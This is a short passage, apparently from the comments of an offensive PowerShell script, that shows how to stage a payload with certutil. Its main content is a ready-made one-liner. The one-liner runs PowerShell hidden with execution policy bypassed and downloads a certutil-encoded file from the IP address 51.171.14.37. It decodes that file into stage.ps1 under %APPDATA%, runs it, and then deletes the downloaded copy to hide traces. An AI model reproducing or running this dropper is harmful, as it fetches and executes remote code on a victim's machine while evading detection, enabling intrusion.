...
#>
certiutil -encode raw.txt cert.cer
...
# One-liner:
powershell.exe -Win hiddeN -Exec ByPasS add-content -path %APPDATA%\cert.cer (New-Object Net.WebClient).DownloadString('http://51.171.14.37/cert.cer'); certutil -decode %APPDATA%\cert.cer %APPDATA%\stage.ps1 | start /b cmd /c powershell.exe  -Exec Bypass -NoExit -File %APPDATA%\stage.ps1 | start /b cmd /c del %APPDATA%\cert.cer
